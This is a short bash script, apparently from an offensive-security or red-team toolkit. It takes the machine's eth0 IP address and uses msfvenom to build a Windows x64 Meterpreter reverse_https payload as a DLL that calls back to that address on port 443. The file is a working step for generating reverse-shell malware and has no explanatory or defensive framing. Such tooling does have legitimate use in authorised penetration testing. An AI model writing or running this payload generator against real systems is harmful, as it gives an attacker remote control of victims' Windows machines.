#!/bin/bash

ipaddress=$(ip a | grep eth0 | grep inet | xargs | cut -d " " -f 2 | cut -d "/" -f 1)
echo "[+] Using Local IP Address: " $ipaddress

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ipaddress LPORT=443 -f dll > ../resources/meterpreter.dll
